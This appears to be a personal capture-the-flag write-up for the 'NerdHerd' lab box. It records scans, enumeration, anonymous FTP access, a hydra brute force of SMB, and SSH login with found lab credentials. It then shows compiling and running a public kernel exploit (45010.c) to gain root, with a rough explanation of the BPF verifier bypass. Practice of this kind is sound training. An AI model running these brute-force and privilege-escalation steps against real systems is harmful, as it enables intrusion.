@@ -1,0 +1,553 @@
+Name: NerdHerd
+Date: 07/03/2022
+Difficulty: Medium (I would say this is an easy box, just frustrating)
+Description: Hack your way into this easy/medium level legendary TV series "Chuck" themed box!
+Better Description: 0xpr0N3rd is troll ; pingu < Wallace and Gromit
+Goals: Complete with 2.5 hours, Recon other machines in background
+Learnt: a bit about Kernel Exploit, why some CTF puzzles are bad.
+
+root@ip-10-10-143-228:~# nmap -sC -sV -O -T 4 -p- 10.10.245.233
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-24 20:30 GMT
+Warning: 10.10.245.233 giving up on port because retransmission cap hit (6).
+Nmap scan report for ip-10-10-245-233.eu-west-1.compute.internal (10.10.245.233)
+Host is up (0.011s latency).
+Not shown: 65530 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.143.228
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 5
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
+|   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
+|_  256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (EdDSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1337/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 02:BC:1F:E2:F9:6D (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=2/24%OT=21%CT=1%CU=42857%PV=Y%DS=1%DC=D%G=Y%M=02BC1F%T
+OS:M=6217F275%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=104%TI=Z%CI=I%TS=8
+OS:)SEQ(SP=101%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M23
+OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
+OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=
+OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
+OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: nerdherd
+|   NetBIOS computer name: NERDHERD\x00
+|   Domain name: \x00
+|   FQDN: nerdherd
+|_  System time: 2022-02-24T23:02:42+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-02-24 21:02:42
+|_  start_date: 1600-12-31 23:58:45
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1943.24 seconds
+
+root@ip-10-10-73-202:~# nmap --script discovery -p 1337 10.10.240.209
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-07 10:02 GMT
+Pre-scan script results:
+| targets-asn: 
+|_  targets-asn.asn is a mandatory parameter
+Nmap scan report for ip-10-10-240-209.eu-west-1.compute.internal (10.10.240.209)
+Host is up (0.0064s latency).
+
+PORT     STATE SERVICE
+1337/tcp open  waste
+MAC Address: 02:C4:5E:2A:39:7F (Unknown)
+
+Host script results:
+| dns-brute: 
+|   DNS Brute-force hostnames: 
+|_    ns0.eu-west-1.compute.internal - 172.16.0.23
+|_fcrdns: PASS (ip-10-10-240-209.eu-west-1.compute.internal)
+|_ipidseq: All zeros
+|_path-mtu: PMTU == 9001
+
+Nmap done: 1 IP address (1 host up) scanned in 30.52 seconds
+
+
+root@ip-10-10-73-202:~# nikto -h 10.10.240.209:1337
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.240.209
++ Target Hostname:    ip-10-10-240-209.eu-west-1.compute.internal
++ Target Port:        1337
++ Start Time:         2022-03-07 10:00:49 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x2deb 0x5af272f8e6600 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ OSVDB-3092: /admin/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ /admin/index.html: Admin login page/section found.
++ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2022-03-07 10:01:03 (GMT0) (14 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+root@ip-10-10-73-202:~# dirb http://10.10.240.209:1337
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Mar  7 10:01:01 2022
+URL_BASE: http://10.10.240.209:1337/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.240.209:1337/ ----
+==> DIRECTORY: http://10.10.240.209:1337/admin/                                                         
++ http://10.10.240.209:1337/index.html (CODE:200|SIZE:11755)                                            
++ http://10.10.240.209:1337/server-status (CODE:403|SIZE:280)                                           
+                                                                                                        
+---- Entering directory: http://10.10.240.209:1337/admin/ ----
+==> DIRECTORY: http://10.10.240.209:1337/admin/css/                                                     
++ http://10.10.240.209:1337/admin/index.html (CODE:200|SIZE:4256)                                       
+                                                                                                        
+---- Entering directory: http://10.10.240.209:1337/admin/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Mon Mar  7 10:01:09 2022
+DOWNLOADED: 9224 - FOUND: 3
+
+root@ip-10-10-73-202:~# gobuster dir -u http://10.10.240.209:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.240.209:1337
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,txt,html
+[+] Timeout:        10s
+===============================================================
+2022/03/07 10:01:46 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/admin (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2022/03/07 10:07:18 Finished
+===============================================================
+
+root@ip-10-10-73-202:~# ftp 10.10.240.209
+Connected to 10.10.240.209.
+220 (vsFTPd 3.0.3)
+Name (10.10.240.209:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> sacii
+?Invalid command
+ftp> ascii
+200 Switching to ASCII mode.
+ftp> passive
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode (10,10,240,209,179,32).
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
+226 Directory send OK.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls
+227 Entering Passive Mode (10,10,240,209,171,164).
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
+226 Directory send OK.
+ftp> get youfoundme.png
+local: youfoundme.png remote: youfoundme.png
+227 Entering Passive Mode (10,10,240,209,161,173).
+150 Opening BINARY mode data connection for youfoundme.png (89894 bytes).
+WARNING! 386 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+89894 bytes received in 0.08 secs (1.0529 MB/s)
+ftp> put bait
+local: bait remote: bait
+227 Entering Passive Mode (10,10,240,209,168,24).
+550 Permission denied.
+
+# While waiting for partial updateAttackbox.sh, thought maybe seperate out differnet topic to update and put them on github.
+# And wen to manually check out the http
+
+curl http://10.10.240.209:1337
+# 0xpron3rd is a troll
+curl http://10.10.240.209:1337/admin/index.html
+<!--
+        these might help:
+                Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
+-->
+
+cibartowski : hehegou<.jÇ].[ÝD
+
+
+# Attackbox was very slow so webpage did not load
+https://github.com/CyberLola/NERDHERD/blob/main/nerdherd_writeup.md
+# Missing FTP stuff always ls -la!!!!!
+# Just not a big enough need
+pub -> .jokesonyou
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .
+drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
+-rw-r--r--    1 ftp      ftp            28 Sep 14  2020 hellon3rd.txt
+226 Directory send OK.
+ftp> get hellon3rd.txt
+local: hellon3rd.txt remote: hellon3rd.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for hellon3rd.txt (28 bytes).
+226 Transfer complete.
+28 bytes received in 0.11 secs (0.2409 kB/s)
+ftp> 
+root@ip-10-10-73-202:~# cat hellon3rd.txt
+all you need is in the leet
+
+root@ip-10-10-193-19:~/smbmap# python3 smbmap.py -H 10.10.240.209
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
+                     https://github.com/ShawnDEvans/smbmap
+
+                                                                                                    
+[+] IP: 10.10.240.209:445       Name: ip-10-10-240-209.eu-west-1.compute.internal       Status: Guest session   
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        nerdherd_classified                                     NO ACCESS       Samba on Ubuntu
+        IPC$                                                    NO ACCESS       IPC Service (nerdherd server (Samba, Ubuntu))
+
+# enum4Linux 
+
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar  7 11:01:56 2022
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.240.209
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 10.10.240.209    |
+ ===================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================= 
+|    Nbtstat Information for 10.10.240.209    |
+ ============================================= 
+Looking up status of 10.10.240.209
+        NERDHERD        <00> -         B <ACTIVE>  Workstation Service
+        NERDHERD        <03> -         B <ACTIVE>  Messenger Service
+        NERDHERD        <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ ====================================== 
+|    Session Check on 10.10.240.209    |
+ ====================================== 
+[+] Server 10.10.240.209 allows sessions using username '', password ''
+
+ ============================================ 
+|    Getting domain SID for 10.10.240.209    |
+ ============================================ 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ======================================= 
+|    OS information on 10.10.240.209    |
+ ======================================= 
+Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
+[+] Got OS info for 10.10.240.209 from smbclient: 
+[+] Got OS info for 10.10.240.209 from srvinfo:
+        NERDHERD       Wk Sv PrQ Unx NT SNT nerdherd server (Samba, Ubuntu)
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+ ============================== 
+|    Users on 10.10.240.209    |
+ ============================== 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc: 
+
+user:[chuck] rid:[0x3e8]
+
+ ========================================== 
+|    Share Enumeration on 10.10.240.209    |
+ ========================================== 
+WARNING: The "syslog" option is deprecated
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        nerdherd_classified Disk      Samba on Ubuntu
+        IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            NERDHERD
+
+[+] Attempting to map shares on 10.10.240.209
+//10.10.240.209/print$  Mapping: DENIED, Listing: N/A
+//10.10.240.209/nerdherd_classified     Mapping: DENIED, Listing: N/A
+//10.10.240.209/IPC$    [E] Can't understand response
+
+
+ ======================================================================== 
+|    Users on 10.10.240.209 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================== 
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-2306820301-2176855359-2727674639
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+S-1-22-1-1000 Unix User\chuck (Local User)
+S-1-22-1-1002 Unix User\ftpuser (Local User)
+S-1-5-21-2306820301-2176855359-2727674639-501 NERDHERD\nobody (Local User)
+S-1-5-21-2306820301-2176855359-2727674639-513 NERDHERD\None (Domain Group)
+S-1-5-21-2306820301-2176855359-2727674639-1000 NERDHERD\chuck (Local User)
+
+# Not finding a password, while I brute forced the smb login.
+# I Decided that actually my recon script should be in golang not bash
+# more xargs is good xargs if enum4linux does not have an output flag
+# Went back to Cyberlola's writeup.
+# The picture had exifdata but my picture was broken
+fijbxslz
+
+# Its Vigenere Cipher, I have come to this but love https://brokentriq.com
+root@ip-10-10-193-19:~# hydra -l chuck -P /usr/share/wordlists/rockyou.txt 10.10.240.209 smb -f
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-03-07 11:09:05
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 14344398 login tries (l:1/p:14344398), ~14344398 tries per task
+[DATA] attacking smb://10.10.240.209:445/
+[STATUS] 588.00 tries/min, 588 tries in 00:01h, 14343810 to do in 406:35h, 1 active
+[STATUS] 597.00 tries/min, 1791 tries in 00:03h, 14342607 to do in 400:25h, 1 active
+[STATUS] 735.00 tries/min, 5145 tries in 00:07h, 14339253 to do in 325:10h, 1 active
+[STATUS] 654.67 tries/min, 9820 tries in 00:15h, 14334578 to do in 364:56h, 1 active
+
+root@ip-10-10-193-19:~# grep -n -e "easypass" /usr/share/wordlists/rockyou.txt
+221955:easypass
+
+# This is why I like walkthroughing the more "puzzley boxes to practice that tools, expoits  and enumeration
+
+smbclient \\\\10.10.240.209\\nerdherd_classified -U chuck
+smb: \> dir
+  .                                   D        0  Fri Sep 11 02:29:53 2020
+  ..                                  D        0  Thu Nov  5 20:44:40 2020
+  secr3t.txt                          N      125  Fri Sep 11 02:29:53 2020
+
+Ssssh! don't tell this anyone because you deserved it this far:
+
+        check out "/this1sn0tadirect0ry"
+
+Sincerely,
+        0xpr0N3rd
+<3
+
+Goto thisisn0tadirectory/creds.txt
+
+alright, enough with the games.
+
+here, take my ssh creds:
+
+        chuck : th1s41ntmypa5s
+
+root@ip-10-10-193-19:~# ssh chuck@10.10.240.209
+
+# Amusingly a big hint to privEsc
+
+747 packages can be updated.
+522 updates are security updates.
+
+Last login: Wed Oct 14 17:03:42 2020 from 22.0.97.11
+
+# While I am manual looking knowing that their is a bonus flag, ssh into machine for second shell and run:
+chuck@nerdherd:~$ grep / -r -e "THM{"  2>/dev/null
+
+chuck@nerdherd:/tmp$ uname -a
+Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+
+# Went through my linuxPrivEsc, then checked CyberLola's writeup and qhum7
+# As kernel exploits can be nasty, checking to my goals
+
+root@ip-10-10-193-19:~# searchsploit linux kernel 4.4.0
+[i] Found (#2): /opt/searchsploit/files_exploits.csv
+[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)
+
+[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
+[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
+
+----------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                         |  Path
+----------------------------------------------------------------------- ---------------------------------
+Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalat | solaris/local/15962.c
+Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 | linux/local/9479.c
+Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local  | linux/local/41995.c
+Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free   | linux/dos/43234.c
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Cond | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                   | linux/dos/41457.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation    | linux/local/41458.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' O | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET | windows_x86-64/local/47170.c
+Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation             | linux/local/41886.c
+Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of S | linux/dos/42136.c
+Linux kernel < 4.10.15 - Race Condition Privilege Escalation           | linux/local/43345.c
+Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege | linux/local/45553.c
+Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                | linux/dos/42762.txt
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Esc | linux/local/45010.c
+Linux Kernel < 4.14.rc3 - Local Denial of Service                      | linux/dos/42932.c
+Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak               | linux/local/44325.c
+Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption   | linux/dos/44832.txt
+Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                         | linux/dos/44579.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Priv | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / | linux/local/47169.c
+Linux Kernel < 4.5.1 - Off-By-One (PoC)                                | linux/dos/44301.c
+----------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Setup transfers
+python3 -m http.server 4444
+wget http://$IP:$PORT/...
+
+# If any of the  follwoing attempts work, I'll then attempt to explain it before my 2.5 hours are up
+# First one:
+
+root@ip-10-10-193-19:~# searchsploit -m linux/local/47169.c
+[.] starting
+[.] checking kernel version
+[-] kernel version not recognized
+root@ip-10-10-193-19:~# searchsploit -m linux/local/43418.c
+[.] starting
+[.] checking distro and kernel versions
+[-] kernel version not recognized
+
+root@ip-10-10-193-19:~#searchsploit -m linux/local/45010.c
+chuck@nerdherd:/tmp$ gcc 45010.c -o pwnX
+
+chuck@nerdherd:/tmp$ ./pwnX
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff88003ae7d300
+[*] Leaking sock struct from ffff880016684380
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff880039fb1e40
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff880039fb1e40
+[*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
+# cat /root/root.txt
+cmon, wouldnt it be too easy if i place the root flag here?
+
+
+# locate root.txt           
+/opt/.root.txt
+/root/root.txt
+## Drop into bash
+# /bin/bash
+root@nerdherd:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
+# History is the hint 
+cat /root/.bash_history
+
+
+## Description of Kernel Exploit
+
+Like some of the others tried prior to 45010.c, Supervisor mode execution protection bypass, but also Supervisor mode Access Prevention bypass. 
+These are features of the kernel that check how the code is accessing memory and what is executing in memory.
+It bypasses the bpf verifier, a static code analysis tool static in that it not running, while it analysing it. 
+It still loads pbf code but create a read/write primitive that has a symbol to extend the bit length to 64 bit from 32 bit. 
+Function check_alu_op() which check the validity of the those 32 and 64 bit operation.
+
+It uses the above to access sk_buff struct then making it to find the sk_rcvtimeo struct. 
+It tests sk_uid to find a variable called sk_peer_cred, that is eight bytes along from sk_uid. 
+It willuse this address to overwrite the crediantal structuree to escalate the user to root.
+                                             
